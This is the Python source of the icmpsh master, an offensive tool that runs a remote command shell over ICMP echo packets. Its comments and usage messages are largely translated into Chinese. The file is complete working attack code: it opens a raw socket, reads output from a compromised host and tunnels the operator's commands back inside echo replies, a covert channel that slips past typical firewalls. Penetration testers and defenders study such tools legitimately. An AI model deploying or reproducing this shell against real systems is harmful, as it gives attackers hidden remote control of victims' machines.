#!/usr/bin/env python
#
# icmpsh - 简单的 icmp 命令 shell（icmpsh-m.pl 的端口编写为
# Perl 作者：Nico Leidecker <nico@leidecker.info>)
#
# 版权所有 (c) 2010，Bernardo Damele A. G. <bernardo.damele@gmail.com>
#
#
# 该程序是免费软件：您可以重新分发它和/或修改
# 它遵循 GNU 通用公共许可证的条款，由
# 自由软件基金会，许可证的版本 3，或
# （由您选择）任何更高版本。
#
# 分发此程序是希望它有用，
# 但不提供任何保证；甚至没有默示保证
# 适销性或特定用途的适用性。  请参阅
# GNU 通用公共许可证了解更多详细信息。
#
# 您应该已收到 GNU 通用公共许可证的副本
# 与这个程序一起。  如果没有，请参见<http://www.gnu.org/licenses/>.

import os
import select
import socket
import sys

def setNonBlocking(fd):
    """
    Make a file descriptor non-blocking
    """

    import fcntl

    flags = fcntl.fcntl(fd, fcntl.F_GETFL)
    flags = flags | os.O_NONBLOCK
    fcntl.fcntl(fd, fcntl.F_SETFL, flags)

def main(src, dst):
    if sys.platform == "nt":
        sys.stderr.write('icmpsh master can only run on Posix systems\n')
        sys.exit(255)

    try:
        from impacket import ImpactDecoder
        from impacket import ImpactPacket
    except ImportError:
        sys.stderr.write('You need to install Python Impacket library first\n')
        sys.exit(255)

    # 使标准输入成为非阻塞文件
    stdin_fd = sys.stdin.fileno()
    setNonBlocking(stdin_fd)

    # 为 ICMP 协议打开一个套接字
    # 在套接字上设置一个特殊选项，以便包含 IP 请求头
    # 与返回的数据
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except socket.error:
        sys.stderr.write('You need to run icmpsh master with administrator privileges\n')
        sys.exit(1)

    sock.setblocking(0)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    # Create a new IP packet and set its source and destination addresses
    ip = ImpactPacket.IP()
    ip.set_ip_src(src)
    ip.set_ip_dst(dst)

    # Create a new ICMP packet of type ECHO REPLY
    icmp = ImpactPacket.ICMP()
    icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)

    # 实例化 IP 数据包解码器
    decoder = ImpactDecoder.IPDecoder()

    while True:
        try:
            cmd = ''

            # 等待收到回复
            if sock in select.select([sock], [], [])[0]:
                buff = sock.recv(4096)

                if 0 == len(buff):
                    # 套接字远程关闭
                    sock.close()
                    sys.exit(0)

                # 收到数据包；解码并显示它
                ippacket = decoder.decode(buff)
                icmppacket = ippacket.child()

                # 如果数据包匹配，则报告给用户
                if ippacket.get_ip_dst() == src and ippacket.get_ip_src() == dst and 8 == icmppacket.get_icmp_type():
                    # 获取标识符和序列号
                    ident = icmppacket.get_icmp_id()
                    seq_id = icmppacket.get_icmp_seq()
                    data = icmppacket.get_data_as_string()

                    if len(data) > 0:
                        sys.stdout.write(data)

                    # 从标准输入解析命令
                    try:
                        cmd = sys.stdin.readline()
                    except:
                        pass

                    if cmd == 'exit\n':
                        return

                    # 设置序列号和标识符
                    icmp.set_icmp_id(ident)
                    icmp.set_icmp_seq(seq_id)

                    # 将命令作为数据包含在 ICMP 数据包中
                    icmp.contains(ImpactPacket.Data(cmd))

                    # 计算其校验和
                    icmp.set_icmp_cksum(0)
                    icmp.auto_checksum = 1

                    # 让 IP 数据包包含 ICMP 数据包（及其载荷）
                    ip.contains(icmp)

                    try:
                        # 发送到目标主机
                        sock.sendto(ip.get_packet(), (dst, 0))
                    except socket.error as ex:
                        sys.stderr.write("'%s'\n" % ex)
                        sys.stderr.flush()
        except:
            break

if __name__ == '__main__':
    if len(sys.argv) < 3:
        msg = '缺少强制选项。以 root 身份执行：\n'
        msg += './icmpsh-m.py <源IP地址> <目的IP地址>\n'
        sys.stderr.write(msg)
        sys.exit(1)

    main(sys.argv[1], sys.argv[2])
